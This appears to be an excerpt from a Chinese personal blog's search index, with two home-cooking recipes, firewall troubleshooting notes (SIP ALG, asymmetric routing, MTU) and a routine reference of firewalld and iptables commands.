    <title>羊肉火锅-牛油辣味</title>
    <url>/2025/02/04/%E7%BE%8A%E8%82%89%E7%81%AB%E9%94%85-%E7%89%9B%E6%B2%B9%E8%BE%A3%E5%91%B3/</url>
    <content><![CDATA[<h2 id="配料"><a href="#配料" class="headerlink" title="配料"></a>配料</h2><p>配料表中的量不包括焯水等步骤的损耗</p>
<style>
table th:nth-of-type(1) {
width: 20%;
}
</style>
<table>
<thead>
<tr>
<th align="center">名称</th>
<th align="left">量</th>
</tr>
</thead>
<tbody><tr>
<td align="center">羊肉</td>
<td align="left">一到两斤左右</td>
</tr>
<tr>
<td align="center">花椒</td>
<td align="left">可放可不放</td>
</tr>
<tr>
<td align="center">香叶</td>
<td align="left">3片左右</td>
</tr>
<tr>
<td align="center">桂皮</td>
<td align="left">一小块</td>
</tr>
<tr>
<td align="center">八角</td>
<td align="left">一个</td>
</tr>
<tr>
<td align="center">干辣椒</td>
<td align="left">若干</td>
</tr>
<tr>
<td align="center">大葱</td>
<td align="left">三段</td>
</tr>
<tr>
<td align="center">姜</td>
<td align="left">适量</td>
</tr>
<tr>
<td align="center">大蒜</td>
<td align="left">适量（半颗左右）</td>
</tr>
<tr>
<td align="center">白萝卜</td>
<td align="left">随意</td>
</tr>
<tr>
<td align="center">海底捞牛油火锅底料</td>
<td align="left">小包的半包</td>
</tr>
</tbody></table>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>1、一点姜、葱、料酒给羊肉焯水，撇去浮沫后捞出备用</p>
<p>2、热油炒香姜、大葱、大蒜、和香料，然后倒入火锅底料翻炒均匀，可加入白胡椒，但是感觉没啥区别</p>
<p>3、加入羊肉翻炒均匀后加水煮90分钟，中途加入萝卜（可高压锅煮45分钟）</p>
]]></content>
      <categories>
        <category>生活</category>
        <category>菜谱</category>
      </categories>
      <tags>
        <tag>羊肉火锅</tag>
        <tag>菜谱</tag>
      </tags>
  </entry>
  <entry>
    <title>莴笋炒腊肠</title>
    <url>/2025/02/10/%E8%8E%B4%E7%AC%8B%E7%82%92%E8%85%8A%E8%82%A0/</url>
    <content><![CDATA[<h2 id="配料"><a href="#配料" class="headerlink" title="配料"></a>配料</h2><style>
table th:nth-of-type(1) {
width: 20%;
}
</style>
<table>
<thead>
<tr>
<th align="center">名称</th>
<th align="left">量</th>
</tr>
</thead>
<tbody><tr>
<td align="center">莴笋</td>
<td align="left">一根</td>
</tr>
<tr>
<td align="center">腊肠</td>
<td align="left">两根</td>
</tr>
<tr>
<td align="center">大蒜</td>
<td align="left">4-5瓣</td>
</tr>
<tr>
<td align="center">姜</td>
<td align="left">适量</td>
</tr>
<tr>
<td align="center">干辣椒</td>
<td align="left">三个</td>
</tr>
<tr>
<td align="center">鸡精</td>
<td align="left">适量</td>
</tr>
<tr>
<td align="center">盐</td>
<td align="left">少</td>
</tr>
<tr>
<td align="center">糖</td>
<td align="left">少</td>
</tr>
<tr>
<td align="center">酱油</td>
<td align="left">适量</td>
</tr>
<tr>
<td align="center">耗油</td>
<td align="left">适量</td>
</tr>
<tr>
<td align="center">香油</td>
<td align="left">适量</td>
</tr>
</tbody></table>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol>
<li>腊肠如果太硬焯水，或者泡水，切片；莴笋切片；姜切丝；干辣椒切段；蒜剥皮随便剁两下；</li>
<li>油烧热炒腊肠微微黄即可；</li>
<li>加姜丝、蒜、干辣椒，炒香后倒入莴笋；</li>
<li>翻炒几下加少量水；加入所有调味料，香油出锅前加入翻炒几下即可。</li>
</ol>
]]></content>
      <categories>
        <category>生活</category>
        <category>菜谱</category>
      </categories>
      <tags>
        <tag>菜谱</tag>
      </tags>
  </entry>
  <entry>
    <title>过防火墙业务端口畅通但业务异常-云虚拟网络</title>
    <url>/2025/01/19/%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%9A%E5%8A%A1%E7%AB%AF%E5%8F%A3%E7%95%85%E9%80%9A%E4%BD%86%E4%B8%9A%E5%8A%A1%E5%BC%82%E5%B8%B8-%E4%BA%91%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C/</url>
    <content><![CDATA[<h2 id="通话语音服务过防火墙异常"><a href="#通话语音服务过防火墙异常" class="headerlink" title="通话语音服务过防火墙异常"></a>通话语音服务过防火墙异常</h2><h3 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h3><p>网络双向畅通；<br>业务服务为语音服务时，仅能单向沟通，也就是只能听到声音但是无法输出；<br>通过抓包检查，输出的数据包未能到达服务器。</p>
<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p><code>检查防火墙的应用层网关ALG功能，该部分会有部分协议不转发，而语音服务使用的时SIP，开启即可</code></p>
<ul>
<li>而且防火墙未开启sip转发也是很正常的，所以当有语音服务过墙时，如果异常最好也同样检查一下是否有开启SIP。</li>
<li>语音服务的厂家也反馈，该问题常常出现。</li>
</ul>
<hr>
<h2 id="端口畅通但部分业务无法使用"><a href="#端口畅通但部分业务无法使用" class="headerlink" title="端口畅通但部分业务无法使用"></a>端口畅通但部分业务无法使用</h2><h3 id="现象-1"><a href="#现象-1" class="headerlink" title="现象"></a>现象</h3><blockquote>
<p>以下场景均可能为相同问题：</p>
</blockquote>
<ol>
<li>堡垒机登录web正常，但无法远程主机;</li>
<li>端口访问正常，业务部分正常，部分异常。</li>
</ol>
<h3 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h3><p><code>检查路由发现，堡垒机到远程主机之间为不同子网，主机路由下一跳网关为防火墙，堡垒机则不是，导致防火墙上只有半个会话，来回路径不一致</code></p>
<ol>
<li>添加明细路由内网流量不经过防火墙；</li>
<li>不建议选择这个方法，修改路由让防火墙会话完整，来回一致。</li>
</ol>
<hr>
<h2 id="传输大文件时失败"><a href="#传输大文件时失败" class="headerlink" title="传输大文件时失败"></a>传输大文件时失败</h2><h3 id="现象-2"><a href="#现象-2" class="headerlink" title="现象"></a>现象</h3><p>经过防火墙时，传输稍微大一点的文件发现无法传输；</p>
<p>其他如果是因为工具限制或者协议限制的情况不考虑，这些比较好判断。</p>
<h3 id="解决方法-2"><a href="#解决方法-2" class="headerlink" title="解决方法"></a>解决方法</h3><p><code>可能是因为MTU设置太小导致的，数据帧大于MTU被丢弃</code></p>
<ul>
<li>调整MTU大小即可</li>
</ul>
]]></content>
      <categories>
        <category>防火墙排障经验</category>
      </categories>
      <tags>
        <tag>防火墙</tag>
        <tag>排障</tag>
      </tags>
  </entry>
  <entry>
    <title>防火墙firewall和iptables命令</title>
    <url>/2024/08/11/%E9%98%B2%E7%81%AB%E5%A2%99firewall%E5%92%8Ciptables%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="firewall"><a href="#firewall" class="headerlink" title="firewall"></a>firewall</h2><h3 id="防火墙管理操作"><a href="#防火墙管理操作" class="headerlink" title="防火墙管理操作"></a>防火墙管理操作</h3><table>
<thead>
<tr>
<th align="center">命令功能</th>
<th align="left">命令</th>
</tr>
</thead>
<tbody><tr>
<td align="center">启动 firewalld.service服务</td>
<td align="left">service firewalld start</td>
</tr>
<tr>
<td align="center">停止firewalld.service服务</td>
<td align="left">service firewalld stop</td>
</tr>
<tr>
<td align="center">重启firewalld.service服务</td>
<td align="left">service firewalld restart</td>
</tr>
<tr>
<td align="center">查看firewall的状态</td>
<td align="left">firewall-cmd - -state</td>
</tr>
<tr>
<td align="center">查看防火墙已有规则列表</td>
<td align="left">firewall-cmd - -list-all</td>
</tr>
<tr>
<td align="center">查看firewall服务状态</td>
<td align="left">systemctl status firewalld</td>
</tr>
</tbody></table>
<p>原文链接：<a href="https://blog.csdn.net/ababab12345/article/details/121989807">https://blog.csdn.net/ababab12345/article/details/121989807</a></p>
<h3 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --permanent --add-port=80/tcp</span><br></pre></td></tr></table></figure>
<h3 id="禁用端口"><a href="#禁用端口" class="headerlink" title="禁用端口"></a>禁用端口</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --permanent --remove-port=80/tcp</span><br></pre></td></tr></table></figure>
<h3 id="刷新规则"><a href="#刷新规则" class="headerlink" title="刷新规则"></a>刷新规则</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>
<h3 id="查询端口是否开放"><a href="#查询端口是否开放" class="headerlink" title="查询端口是否开放"></a>查询端口是否开放</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --query-port=80w/tcp</span><br></pre></td></tr></table></figure>
<h3 id="查看已开放的端口"><a href="#查看已开放的端口" class="headerlink" title="查看已开放的端口"></a>查看已开放的端口</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --list-ports</span><br></pre></td></tr></table></figure>
<h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><h3 id="防火墙命令参数"><a href="#防火墙命令参数" class="headerlink" title="防火墙命令参数"></a>防火墙命令参数</h3><table>
<thead>
<tr>
<th align="right">选 项</th>
<th align="left">功 能</th>
</tr>
</thead>
<tbody><tr>
<td align="right">-A</td>
<td align="left">添加防火墙规则</td>
</tr>
<tr>
<td align="right">-D</td>
<td align="left">删除防火墙规则</td>
</tr>
<tr>
<td align="right">-I</td>
<td align="left">插入防火墙规则</td>
</tr>
<tr>
<td align="right">-F</td>
<td align="left">清空防火墙规则</td>
</tr>
<tr>
<td align="right">-L</td>
<td align="left">列出添加防火墙规则</td>
</tr>
<tr>
<td align="right">-R</td>
<td align="left">替换防火墙规则</td>
</tr>
<tr>
<td align="right">-Z</td>
<td align="left">清空防火墙数据表统计信息</td>
</tr>
<tr>
<td align="right">-P</td>
<td align="left">设置链默认规则</td>
</tr>
</tbody></table>
<h3 id="防火墙规则增删改参数"><a href="#防火墙规则增删改参数" class="headerlink" title="防火墙规则增删改参数"></a>防火墙规则增删改参数</h3><table>
<thead>
<tr>
<th align="center">参 数</th>
<th align="left">功 能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">[!]-p</td>
<td align="left">匹配协议（不加协议则是all），! 表示取反</td>
</tr>
<tr>
<td align="center">[!]-s</td>
<td align="left">匹配源地址</td>
</tr>
<tr>
<td align="center">[!]-d</td>
<td align="left">匹配目标地址</td>
</tr>
<tr>
<td align="center">[!]-i</td>
<td align="left">匹配入站网卡接口</td>
</tr>
<tr>
<td align="center">[!]-o</td>
<td align="left">匹配出站网卡接口</td>
</tr>
<tr>
<td align="center">[!]–sport</td>
<td align="left">匹配源端口</td>
</tr>
<tr>
<td align="center">[!]–dport</td>
<td align="left">匹配目标端口</td>
</tr>
<tr>
<td align="center">[!]–src-range</td>
<td align="left">匹配源地址范围</td>
</tr>
<tr>
<td align="center">[!]–dst-range</td>
<td align="left">匹配目标地址范围</td>
</tr>
<tr>
<td align="center">[!]–limit</td>
<td align="left">四配数据表速率</td>
</tr>
<tr>
<td align="center">[!]–mac-source</td>
<td align="left">匹配源MAC地址</td>
</tr>
<tr>
<td align="center">[!]–sports</td>
<td align="left">匹配源端口</td>
</tr>
<tr>
<td align="center">[!]–dports</td>
<td align="left">匹配目标端口</td>
</tr>
<tr>
<td align="center">[!]–stste</td>
<td align="left">匹配状态（INVALID、ESTABLISHED、NEW、RELATED)</td>
</tr>
<tr>
<td align="center">[!]–string</td>
<td align="left">匹配应用层字串</td>
</tr>
</tbody></table>
<h3 id="防火墙信息详细意义"><a href="#防火墙信息详细意义" class="headerlink" title="防火墙信息详细意义"></a>防火墙信息详细意义</h3><table>
<thead>
<tr>
<th align="center">触发动作</th>
<th align="left">功 能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">ACCEPT</td>
<td align="left">允许数据包通过</td>
</tr>
<tr>
<td align="center">DROP</td>
<td align="left">丢弃数据包</td>
</tr>
<tr>
<td align="center">REJECT</td>
<td align="left">拒绝数据包通过</td>
</tr>
<tr>
<td align="center">LOG</td>
<td align="left">将数据包信息记录 syslog 曰志</td>
</tr>
<tr>
<td align="center">DNAT</td>
<td align="left">目标地址转换</td>
</tr>
<tr>
<td align="center">SNAT</td>
<td align="left">源地址转换</td>
</tr>
<tr>
<td align="center">MASQUERADE</td>
<td align="left">地址欺骗</td>
</tr>
<tr>
<td align="center">REDIRECT</td>
<td align="left">重定向</td>
</tr>
</tbody></table>
<p>原文链接：<a href="https://blog.csdn.net/daocaokafei/article/details/115091313">https://blog.csdn.net/daocaokafei/article/details/115091313</a></p>
<h3 id="命令使用实例"><a href="#命令使用实例" class="headerlink" title="命令使用实例"></a>命令使用实例</h3><p>查看防火墙规则</p>
<pre><code>iptables -L （可加INPUT或者OUTPUT等参数）
</code></pre>
<p>开放端口</p>
<pre><code>iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT
</code></pre>
<p>增加规则</p>
<pre><code>iptables -A INPUT -s 192.168.1.5 -j DROP
</code></pre>
<p>改规则</p>
<pre><code>iptables -R INPUT 6 -s 194.168.1.5 -j ACCEPT
</code></pre>
<p>删规则</p>
<pre><code>iptables -D INPUT 6
</code></pre>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>linux</category>
        <category>命令</category>
      </categories>
      <tags>
        <tag>linux命令</tag>
      </tags>
  </entry>
</search>
